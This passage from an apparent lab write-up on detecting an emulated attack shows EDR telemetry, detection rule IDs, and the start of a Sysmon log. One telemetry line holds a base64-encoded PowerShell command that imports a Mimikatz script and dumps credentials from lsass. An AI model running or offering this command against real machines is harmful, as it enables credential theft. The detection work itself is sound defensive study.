+</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  9</span><span><span style=color:#f1fa8c>&#34;FILE_PATH&#34;</span>:<span style=color:#f1fa8c>&#34;C:\Windows\system32\lsass.exe&#34;</span>
+</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 10</span><span><span style=color:#f1fa8c>&#34;HASH&#34;</span>:<span style=color:#f1fa8c>&#34;055a1226a769948a79ed0972bdee2d91937c4b521e0b9046f9b8ccc63d110115&#34;</span>
+</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 11</span><span><span style=color:#f1fa8c>&#34;MEMORY_USAGE&#34;</span>:<span style=color:#bd93f9>18059264</span>
+</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 12</span><span><span style=color:#f1fa8c>&#34;PARENT&#34;</span>:{
+</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 13</span><span><span style=color:#ff79c6>&#34;FILE_IS_SIGNED&#34;</span>:<span style=color:#bd93f9>1</span>
+</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 14</span><span><span style=color:#f1fa8c>&#34;FILE_PATH&#34;</span>:<span style=color:#f1fa8c>&#34;\Device\HarddiskVolume3\Windows\System32\wininit.exe&#34;</span>
+</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 15</span><span><span style=color:#f1fa8c>&#34;HASH&#34;</span>:<span style=color:#f1fa8c>&#34;ba26910be549b8700c08fbe2f160952288864470a30dd35c3c6b7782f7dbf857&#34;</span>
+</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 16</span><span><span style=color:#f1fa8c>&#34;MEMORY_USAGE&#34;</span>:<span style=color:#bd93f9>7294976</span>
+</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 17</span><span><span style=color:#f1fa8c>&#34;PARENT_PROCESS_ID&#34;</span>:<span style=color:#bd93f9>468</span>
+</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 18</span><span><span style=color:#f1fa8c>&#34;PROCESS_ID&#34;</span>:<span style=color:#bd93f9>556</span>
+</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 19</span><span><span style=color:#f1fa8c>&#34;THIS_ATOM&#34;</span>:<span style=color:#f1fa8c>&#34;3967514abcef88b71ac5fb8c68db7bc6&#34;</span>
+</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 20</span><span><span style=color:#f1fa8c>&#34;THREADS&#34;</span>:<span style=color:#bd93f9>5</span>
+</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 21</span><span><span style=color:#f1fa8c>&#34;TIMESTAMP&#34;</span>:<span style=color:#bd93f9>1759214534730</span>
+</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 22</span><span><span style=color:#f1fa8c>&#34;USER_NAME&#34;</span>:<span style=color:#f1fa8c>&#34;NT AUTHORITY\SYSTEM&#34;</span>
+</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 23</span><span>}
+</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 24</span><span><span style=color:#f1fa8c>&#34;PARENT_PROCESS_ID&#34;</span>:<span style=color:#bd93f9>556</span>
+</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 25</span><span><span style=color:#f1fa8c>&#34;PROCESS_ID&#34;</span>:<span style=color:#bd93f9>724</span>
+</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 26</span><span><span style=color:#f1fa8c>&#34;THREADS&#34;</span>:<span style=color:#bd93f9>18</span>
+</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 27</span><span><span style=color:#f1fa8c>&#34;USER_NAME&#34;</span>:<span style=color:#f1fa8c>&#34;NT AUTHORITY\SYSTEM&#34;</span>
+</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 28</span><span>}
+</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 29</span><span><span style=color:#f1fa8c>&#34;routing&#34;</span>:{
+</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 30</span><span><span style=color:#ff79c6>&#34;arch&#34;</span>:<span style=color:#bd93f9>2</span>
+</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 31</span><span><span style=color:#f1fa8c>&#34;did&#34;</span>:<span style=color:#f1fa8c>&#34;&#34;</span>
+</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 32</span><span><span style=color:#f1fa8c>&#34;event_id&#34;</span>:<span style=color:#f1fa8c>&#34;6e73c01f-a6d0-43cf-bb9a-d65b1ac5ac9f&#34;</span>
+</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 33</span><span><span style=color:#f1fa8c>&#34;event_time&#34;</span>:<span style=color:#bd93f9>1759214534808</span>
+</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 34</span><span><span style=color:#f1fa8c>&#34;event_type&#34;</span>:<span style=color:#f1fa8c>&#34;EXISTING_PROCESS&#34;</span>
+</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 35</span><span><span style=color:#f1fa8c>&#34;ext_ip&#34;</span>:<span style=color:#f1fa8c>&#34;79.238.92.208&#34;</span>
+</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 36</span><span><span style=color:#f1fa8c>&#34;hostname&#34;</span>:<span style=color:#f1fa8c>&#34;client1.ssnrshnn.local&#34;</span>
+</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 37</span><span><span style=color:#f1fa8c>&#34;iid&#34;</span>:<span style=color:#f1fa8c>&#34;9b03d810-e114-4352-9392-a1186feb7894&#34;</span>
+</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 38</span><span><span style=color:#f1fa8c>&#34;int_ip&#34;</span>:<span style=color:#f1fa8c>&#34;10.1.2.10&#34;</span>
+</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 39</span><span><span style=color:#f1fa8c>&#34;latency&#34;</span>:<span style=color:#bd93f9>9894730</span>
+</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 40</span><span><span style=color:#f1fa8c>&#34;moduleid&#34;</span>:<span style=color:#bd93f9>2</span>
+</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 41</span><span><span style=color:#f1fa8c>&#34;oid&#34;</span>:<span style=color:#f1fa8c>&#34;c73795e0-a62c-4854-9462-be3d08769aa1&#34;</span>
+</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 42</span><span><span style=color:#f1fa8c>&#34;parent&#34;</span>:<span style=color:#f1fa8c>&#34;3967514abcef88b71ac5fb8c68db7bc6&#34;</span>
+</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 43</span><span><span style=color:#f1fa8c>&#34;plat&#34;</span>:<span style=color:#bd93f9>268435456</span>
+</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 44</span><span><span style=color:#f1fa8c>&#34;sid&#34;</span>:<span style=color:#f1fa8c>&#34;23bf4a39-63f5-4808-8a3a-772460439fe4&#34;</span>
+</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 45</span><span><span style=color:#f1fa8c>&#34;tags&#34;</span>:[
+</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 46</span><span><span style=color:#f1fa8c>&#34;windows&#34;</span>
+</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 47</span><span>]
+</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 48</span><span><span style=color:#f1fa8c>&#34;this&#34;</span>:<span style=color:#f1fa8c>&#34;bc44a81e80f8a296c46926a068db7bc6&#34;</span>
+</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 49</span><span>}
+</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 50</span><span>}
+</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 51</span><span>{
+</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 52</span><span><span style=color:#ff79c6>&#34;event&#34;</span>:{
+</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 53</span><span><span style=color:#ff79c6>&#34;ACCESS_FLAGS&#34;</span>:<span style=color:#bd93f9>4112</span>
+</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 54</span><span><span style=color:#f1fa8c>&#34;PARENT_PROCESS_ID&#34;</span>:<span style=color:#bd93f9>11252</span>
+</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 55</span><span><span style=color:#f1fa8c>&#34;PROCESS_ID&#34;</span>:<span style=color:#bd93f9>724</span>
+</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 56</span><span><span style=color:#f1fa8c>&#34;SOURCE&#34;</span>:{
+</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 57</span><span><span style=color:#ff79c6>&#34;BASE_ADDRESS&#34;</span>:<span style=color:#bd93f9>140698751074304</span>
+</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 58</span><span><span style=color:#f1fa8c>&#34;COMMAND_LINE&#34;</span>:<span style=color:#f1fa8c>&#34;&#34;</span>C:\Windows\System<span style=color:#bd93f9>32</span>\WindowsPowerShell\v<span style=color:#bd93f9>1.0</span>\powershell.exe<span style=color:#f1fa8c>&#34; -Enc SQBtAHAAbwByAHQALQBNAG8AZAB1AGwAZQAgAC4AXABpAG4AdgBvAGsAZQAtAG0AaQBtAGkALgBwAHMAMQA7AEkAbgB2AG8AawBlAC0ATQBpAG0AaQBrAGEAdAB6ACAALQBEAHU…&#34;</span>
+</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 59</span><span><span style=color:#f1fa8c>&#34;FILE_IS_SIGNED&#34;</span>:<span style=color:#bd93f9>1</span>
+</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 60</span><span><span style=color:#f1fa8c>&#34;FILE_PATH&#34;</span>:<span style=color:#f1fa8c>&#34;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe&#34;</span>
+</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 61</span><span><span style=color:#f1fa8c>&#34;HASH&#34;</span>:<span style=color:#f1fa8c>&#34;9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3&#34;</span>
+</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 62</span><span><span style=color:#f1fa8c>&#34;MEMORY_USAGE&#34;</span>:<span style=color:#bd93f9>55980032</span>
+</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 63</span><span><span style=color:#f1fa8c>&#34;PARENT_ATOM&#34;</span>:<span style=color:#f1fa8c>&#34;93f03d982581d01a60b06cba68dba265&#34;</span>
+</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 64</span><span><span style=color:#f1fa8c>&#34;PARENT_PROCESS_ID&#34;</span>:<span style=color:#bd93f9>3216</span>
+</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 65</span><span><span style=color:#f1fa8c>&#34;PROCESS_ID&#34;</span>:<span style=color:#bd93f9>11252</span>
+</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 66</span><span><span style=color:#f1fa8c>&#34;THIS_ATOM&#34;</span>:<span style=color:#f1fa8c>&#34;cc8071e656660e7cce7b8b8a68dba265&#34;</span>
+</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 67</span><span><span style=color:#f1fa8c>&#34;THREADS&#34;</span>:<span style=color:#bd93f9>19</span>
+</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 68</span><span><span style=color:#f1fa8c>&#34;TIMESTAMP&#34;</span>:<span style=color:#bd93f9>1759224420994</span>
+</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 69</span><span><span style=color:#f1fa8c>&#34;USER_NAME&#34;</span>:<span style=color:#f1fa8c>&#34;SSNRSHNN\goadmin&#34;</span>
+</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 70</span><span>}
+</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 71</span><span><span style=color:#f1fa8c>&#34;TARGET&#34;</span>:{
+</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 72</span><span><span style=color:#ff79c6>&#34;BASE_ADDRESS&#34;</span>:<span style=color:#bd93f9>140695010410496</span>
+</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 73</span><span><span style=color:#f1fa8c>&#34;COMMAND_LINE&#34;</span>:<span style=color:#f1fa8c>&#34;C:\Windows\system32\lsass.exe&#34;</span>
+</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 74</span><span><span style=color:#f1fa8c>&#34;CREATION_TIME&#34;</span>:<span style=color:#bd93f9>1759214458410</span>
+</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 75</span><span><span style=color:#f1fa8c>&#34;FILE_IS_SIGNED&#34;</span>:<span style=color:#bd93f9>1</span>
+</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 76</span><span><span style=color:#f1fa8c>&#34;FILE_PATH&#34;</span>:<span style=color:#f1fa8c>&#34;C:\Windows\system32\lsass.exe&#34;</span>
+</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 77</span><span><span style=color:#f1fa8c>&#34;HASH&#34;</span>:<span style=color:#f1fa8c>&#34;055a1226a769948a79ed0972bdee2d91937c4b521e0b9046f9b8ccc63d110115&#34;</span>
+</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 78</span><span><span style=color:#f1fa8c>&#34;MEMORY_USAGE&#34;</span>:<span style=color:#bd93f9>18059264</span>
+</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 79</span><span><span style=color:#f1fa8c>&#34;PARENT_ATOM&#34;</span>:<span style=color:#f1fa8c>&#34;3967514abcef88b71ac5fb8c68db7bc6&#34;</span>
+</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 80</span><span><span style=color:#f1fa8c>&#34;PARENT_PROCESS_ID&#34;</span>:<span style=color:#bd93f9>556</span>
+</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 81</span><span><span style=color:#f1fa8c>&#34;PROCESS_ID&#34;</span>:<span style=color:#bd93f9>724</span>
+</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 82</span><span><span style=color:#f1fa8c>&#34;THIS_ATOM&#34;</span>:<span style=color:#f1fa8c>&#34;bc44a81e80f8a296c46926a068db7bc6&#34;</span>
+</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 83</span><span><span style=color:#f1fa8c>&#34;THREADS&#34;</span>:<span style=color:#bd93f9>18</span>
+</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 84</span><span><span style=color:#f1fa8c>&#34;TIMESTAMP&#34;</span>:<span style=color:#bd93f9>1759214534808</span>
+</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 85</span><span><span style=color:#f1fa8c>&#34;USER_NAME&#34;</span>:<span style=color:#f1fa8c>&#34;NT AUTHORITY\SYSTEM&#34;</span>
+</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 86</span><span>}
+</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 87</span><span>}
+</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 88</span><span><span style=color:#f1fa8c>&#34;routing&#34;</span>:{
+</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 89</span><span><span style=color:#ff79c6>&#34;arch&#34;</span>:<span style=color:#bd93f9>2</span>
+</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 90</span><span><span style=color:#f1fa8c>&#34;did&#34;</span>:<span style=color:#f1fa8c>&#34;&#34;</span>
+</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 91</span><span><span style=color:#f1fa8c>&#34;event_id&#34;</span>:<span style=color:#f1fa8c>&#34;512d1106-bfd7-4502-8322-3a93ae528dd3&#34;</span>
+</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 92</span><span><span style=color:#f1fa8c>&#34;event_time&#34;</span>:<span style=color:#bd93f9>1759224428796</span>
+</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 93</span><span><span style=color:#f1fa8c>&#34;event_type&#34;</span>:<span style=color:#f1fa8c>&#34;REMOTE_PROCESS_HANDLE&#34;</span>
+</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 94</span><span><span style=color:#f1fa8c>&#34;ext_ip&#34;</span>:<span style=color:#f1fa8c>&#34;79.238.92.208&#34;</span>
+</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 95</span><span><span style=color:#f1fa8c>&#34;hostname&#34;</span>:<span style=color:#f1fa8c>&#34;client1.ssnrshnn.local&#34;</span>
+</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 96</span><span><span style=color:#f1fa8c>&#34;iid&#34;</span>:<span style=color:#f1fa8c>&#34;9b03d810-e114-4352-9392-a1186feb7894&#34;</span>
+</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 97</span><span><span style=color:#f1fa8c>&#34;int_ip&#34;</span>:<span style=color:#f1fa8c>&#34;10.1.2.10&#34;</span>
+</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 98</span><span><span style=color:#f1fa8c>&#34;latency&#34;</span>:<span style=color:#bd93f9>742</span>
+</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 99</span><span><span style=color:#f1fa8c>&#34;moduleid&#34;</span>:<span style=color:#bd93f9>2</span>
+</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">100</span><span><span style=color:#f1fa8c>&#34;oid&#34;</span>:<span style=color:#f1fa8c>&#34;c73795e0-a62c-4854-9462-be3d08769aa1&#34;</span>
+</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">101</span><span><span style=color:#f1fa8c>&#34;parent&#34;</span>:<span style=color:#f1fa8c>&#34;cc8071e656660e7cce7b8b8a68dba265&#34;</span>
+</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">102</span><span><span style=color:#f1fa8c>&#34;plat&#34;</span>:<span style=color:#bd93f9>268435456</span>
+</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">103</span><span><span style=color:#f1fa8c>&#34;sid&#34;</span>:<span style=color:#f1fa8c>&#34;23bf4a39-63f5-4808-8a3a-772460439fe4&#34;</span>
+</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">104</span><span><span style=color:#f1fa8c>&#34;tags&#34;</span>:[
+</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">105</span><span><span style=color:#f1fa8c>&#34;windows&#34;</span>
+</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">106</span><span>]
+</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">107</span><span><span style=color:#f1fa8c>&#34;target&#34;</span>:<span style=color:#f1fa8c>&#34;bc44a81e80f8a296c46926a068db7bc6&#34;</span>
+</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">108</span><span><span style=color:#f1fa8c>&#34;this&#34;</span>:<span style=color:#f1fa8c>&#34;c70d30c812b50e428fb9298e68dba26d&#34;</span>
+</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">109</span><span>}
+</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">110</span><span>}
+</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">111</span><span>]
+</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">112</span><span>}
+</span></span></code></pre></div><p><strong>LimaCharlie Detection:</strong></p><p><img src=/images/calderaalice/32.png alt=alice></p><p>Suspicious <strong>lsass</strong> detection by soteria edr rules.</p><p><img src=/images/calderaalice/33.png alt=alice></p><p>Let me have this process interpreted by AI in Detection > relevantLsassProcess > AI Explain.</p><p><img src=/images/calderaalice/34.png alt=alice></p><p>As you can see in the image above, LimaCharlie has an AI module that makes things much easier by explaining the alert, TTPs, investigation steps, and more.</p><p><strong>Detection Rules that are matched with relevant processes:</strong></p><ul><li><strong>ext-sigma-7a14fbc3-54d9-4b4d-8700-61eddada04f0</strong></li><li><strong>soteria-rules-edr-926e2197-189b-4d89-9675-c8993933dc9a</strong></li></ul><p><strong>Wazuh Output:</strong></p><p><img src=/images/calderaalice/35.png alt=alice></p><p><img src=/images/calderaalice/37.png alt=alice></p><p><strong>Sysmon Output</strong></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span><span style=color:#f1fa8c>&#34;Process Create:
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span><span style=color:#f1fa8c>RuleName: -
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span><span style=color:#f1fa8c>UtcTime: 2025-09-30 09:26:59.823
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span><span style=color:#f1fa8c>ProcessGuid: {46fa3f9b-a263-68db-1c05-000000000900}
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span><span style=color:#f1fa8c>ProcessId: 3216
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span><span style=color:#f1fa8c>Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span><span style=color:#f1fa8c>FileVersion: 10.0.19041.3996 (WinBuild.160101.0800)
